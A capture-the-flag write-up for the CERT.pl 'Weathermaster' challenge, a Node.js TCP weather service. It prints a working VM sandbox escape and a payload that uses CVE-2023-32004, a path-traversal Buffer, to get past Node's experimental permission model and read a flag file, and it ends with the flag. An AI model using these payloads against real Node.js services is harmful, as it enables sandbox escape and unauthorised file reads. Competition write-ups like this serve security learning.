# [Weathermaster](https://hack.cert.pl/challenge/weathermaster)

## Task

We are given a TCP service written in Node.js, which tells the weather.

## Solution

We can read the source code using `cat`: [index.js](./index.js)

And we can execute arbitrary JS code using `! <code>`

This app uses:
1. Node.js VM
2. Experimental Node.js permission system, which prevents us from reading outside /app:
    `node --experimental-permission --allow-fs-read="/app/*" /app/index.js`

We can easily [bypass the VM](https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af) using stuff like:

```js
this.constructor.constructor("process.mainModule.constructor._load('fs')")
```

And we can discover that in the Node.js this service uses there is a cool vulnerability: `CVE-2023-32004: Permission model can be bypassed by specifying a path traversal sequence in a Buffer (High)` - instead of passing the path as a string, we need to pass it as a Buffer.

Finally, the solution:
```js
this.constructor.constructor(`return process.mainModule.constructor._load('fs').readFileSync(Buffer.from('/app/../flag.txt')).toString()`)()
```

[Solve script](./solve.py)

`ecsc24{whats_th3_f0recast_f0r_nodejs?}`